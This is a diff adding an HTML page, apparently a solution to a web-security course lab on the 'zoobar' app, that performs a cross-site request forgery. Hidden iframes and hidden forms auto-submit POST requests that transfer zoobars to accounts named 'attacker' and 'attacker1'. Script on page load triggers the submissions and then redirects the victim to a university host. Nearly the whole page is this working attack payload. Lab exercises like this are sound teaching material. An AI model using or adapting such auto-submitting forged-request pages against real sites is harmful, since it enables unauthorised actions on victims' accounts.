@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8"/>
+	<title>Cross-Site Request Forgery</title>
+</head>
+
+
+<body>
+	<iframe style="visibility: hidden;" name="iframe" id="iframe" ></iframe>
+	<iframe style="visibility: hidden;" name="iframe1" id="iframe1" ></iframe>
+
+	<div style="visibility:hidden" id='div'>
+		<form method = "POST" name="transferform" id = "transferform" action = "http://localhost:8080/zoobar/index.cgi/transfer" target = "iframe">
+			<input name="zoobars" type="text" value="1" size=5/>
+			<input name="recipient" type="text" value="attacker" size=10/>
+			<input name="submission" type="submit" value="Send">
+		</form>
+		<form method = "POST" name="transferform1" id = "transferform1" action = "http://localhost:8080/zoobar/index.cgi/transfer" target = "iframe1">
+			<input name="zoobars" type="text" value="9" size=5/>
+			<input name="recipient" type="text" value="attacker1" size=10/>
+			<input name="submission" type="submit"  value="Send">
+		</form>
+	</div>
+
+	<script>
+		var i = 0;
+		var j = 0;
+		document.getElementById('iframe').onload = function () {
+			if(i == 0){
+				// document.transferform.getElementsByTagName('input')[0].value = "1";  
+			 //    document.transferform.getElementsByTagName('input')[1].value = "attacker";         
+			    document.getElementById("transferform").submit();
+			    // document.transferform1.getElementsByTagName('input')[0].value = "9";  
+			    // document.transferform1.getElementsByTagName('input')[1].value = "attacker1"; 
+				document.getElementById("transferform1").submit();
+
+				i = 1;
+			}
+			else window.location = "http://cseproj91.cse.iitk.ac.in:9443";
+		};
+		// document.getElementById('iframe1').onload = function () {
+		// 	if(j == 0){
+		// 		// document.transferform.getElementsByTagName('input')[0].value = "1";  
+		// 	 //    document.transferform.getElementsByTagName('input')[1].value = "attacker";         
+		// 	    // document.getElementById("transferform").submit();
+		// 	    // document.transferform1.getElementsByTagName('input')[0].value = "9";  
+		// 	    // document.transferform1.getElementsByTagName('input')[1].value = "attacker1"; 
+		// 		document.getElementById("transferform1").submit();
+
+		// 		j = 1;
+		// 	}
+		 	
+		// };
+		
+	</script>
+
+</body>
